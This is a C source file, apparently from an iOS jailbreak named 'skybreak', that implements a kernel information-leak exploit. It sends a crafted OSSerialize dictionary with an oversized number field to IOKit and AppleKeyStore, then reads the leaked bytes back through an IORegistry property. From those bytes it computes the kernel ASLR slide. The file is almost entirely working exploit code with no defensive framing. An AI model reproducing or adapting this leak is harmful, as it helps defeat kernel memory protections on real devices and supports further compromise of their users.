//
//  kleak.c
//  skybreak
//
//  Created by Cryptic on 1/8/18.
//  Updated by Cryptic on 9/11/18
//  Copyright © 2018 Cryptic. All rights reserved.
//

#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <stdio.h>

enum
{
    kOSSerializeDictionary   = 0x01000000U,
    kOSSerializeArray        = 0x02000000U,
    kOSSerializeSet          = 0x03000000U,
    kOSSerializeNumber       = 0x04000000U,
    kOSSerializeSymbol       = 0x08000000U,
    kOSSerializeString       = 0x09000000U,
    kOSSerializeData         = 0x0a000000U,
    kOSSerializeBoolean      = 0x0b000000U,
    kOSSerializeObject       = 0x0c000000U,
    kOSSerializeTypeMask     = 0x7F000000U,
    kOSSerializeDataMask     = 0x00FFFFFFU,
    kOSSerializeEndCollecton = 0x80000000U,
};

unsigned int kslide = 0;
unsigned int addr = 0x80099735;

unsigned int get_kslide()
{
    
    uint32_t malDict[] =
    {
        0x000000d3,
        kOSSerializeEndCollecton | kOSSerializeDictionary | 2,
        kOSSerializeSymbol | 4,
        0x00414141,
        kOSSerializeEndCollecton | kOSSerializeNumber | 0x200,
        0x41414141,
        0x41414141
    };
    
    size_t idx = sizeof(malDict);
    io_service_t _service = 0;
    io_connect_t _connect = 0;
    io_iterator_t _iterate = 0;
    
    mach_port_t master_port = MACH_PORT_NULL, _result = MACH_PORT_NULL;
    kern_return_t kern_ret = 0, kern_err = 0;
    
    host_get_io_master(mach_host_self(), &master_port);
    
    kern_ret = io_service_get_matching_services_bin(master_port, (char*)malDict, idx, &_result);
    
    if (kern_ret == KERN_SUCCESS)
    {
        printf("Dictionary is valid");
    }
    else
    {
        printf("Error: Dictionary is invalid");
        return -1;
    }
    
    _service = IOServiceGetMatchingService(master_port, IOServiceMatching("AppleKeyStore"));
    
    kern_ret = io_service_open_extended(_service, mach_task_self(), 0, NDR_record, (io_buf_ptr_t) malDict, idx, &kern_err, &_connect);
    
    if (kern_ret == KERN_SUCCESS)
    {
        printf("UserClient spawned successfully");
    }
    else
    {
        printf("Error: UserClient failed with: %d", kern_err);
        return -1;
    }
    
    IORegistryEntryCreateIterator(_service, "IOService", kIORegistryIterateRecursively, &_iterate);
    
    io_object_t object = 0;
    
    uint32_t bytes = 0;
    char buf[0x200] = { 0 };
    
    while(bytes == 0)
    {
        if(object)
        {
            IOObjectRelease(object);
        }
        object = IOIteratorNext(_iterate);
        
        mach_msg_type_number_t bufCount = 0x200;
        
        kern_ret = io_registry_entry_get_property_bytes(object, "AAA", (char*)&buf, &bufCount);
        
        bytes = *(uint32_t*)(buf);
        
    }
    
    kslide = ((*(uint32_t*)(buf + 36)) - addr);
    
    return kslide;
    
}
